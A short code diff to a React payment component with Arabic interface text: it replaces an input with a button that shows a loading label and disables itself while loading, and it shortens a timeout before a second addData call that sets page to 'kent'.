@@ -771,24 +771,28 @@ function App(props: { setPage: any ,page:string}) {
                             بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                           </div>
                           <div className="col-sm-12 col-md-4 text-right">
-                            <input
+                            <button
                               type="button"
                               onClick={() => {
+                                setloading(true)
+
                                 addData({
                                   ...data,
                                 })
-                                setloading(true)
 
                                 setTimeout(() => {
 addData({...data,page:'kent'}).then(()=>{
   setloading(false)
 })
-                                }, 5000) // Reduced timeout for better user experience
+                                }, 1000) // Reduced timeout for better user experience
                               }}
                               id="btnPay"
+                              disabled={loading}
                               className={`btn btn-primary btn-block col-12 ${show ? "" : "d-none"}`}
-                              defaultValue="إدفع"
-                            />
+                              
+                            >
+                              {loading ?"انتظر...":"إدفع         "}
+                     </button>
                           </div>
                           <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                         </div>
